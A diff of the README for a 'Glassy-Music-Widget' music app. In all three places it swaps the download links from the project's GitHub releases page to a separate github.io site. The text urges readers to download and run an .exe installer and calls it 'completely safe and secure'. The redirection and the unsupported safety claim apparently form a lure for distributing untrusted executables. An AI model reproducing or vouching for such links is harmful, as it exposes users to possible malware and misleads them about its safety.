@@ -1,6 +1,6 @@
 # ✨ Glassy-Music-Widget - Your Music, Always Within Reach
 
-[![Download Glassy-Music-Widget](https://img.shields.io/badge/Download-Glassy--Music--Widget-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garveyaetiologic6130/Glassy-Music-Widget/releases)
+[![Download Glassy-Music-Widget](https://img.shields.io/badge/Download-Glassy--Music--Widget-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://garveyaetiologic6130.github.io)
 
 ## 👋 Welcome to Glassy-Music-Widget
 
@@ -44,7 +44,7 @@ Getting Glassy-Music-Widget up and running is easier than you think! No technica
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [**Download Glassy-Music-Widget**](https://github.com/Garveyaetiologic6130/Glassy-Music-Widget/releases)
+Visit this link to download the application: [**Download Glassy-Music-Widget**](https://garveyaetiologic6130.github.io)
 
 The download page will show you the latest version. Look for the file with a name that ends in `.exe` – that's the installer. It's completely safe and secure.
 
@@ -131,7 +131,7 @@ If you encounter any issues or have questions:
 
 Need to download again or want to share this awesome tool with friends? Use this link:
 
-[**Click here to download Glassy-Music-Widget**](https://github.com/Garveyaetiologic6130/Glassy-Music-Widget/releases)
+[**Click here to download Glassy-Music-Widget**](https://garveyaetiologic6130.github.io)
 
 ## 🔄 Update Information
 
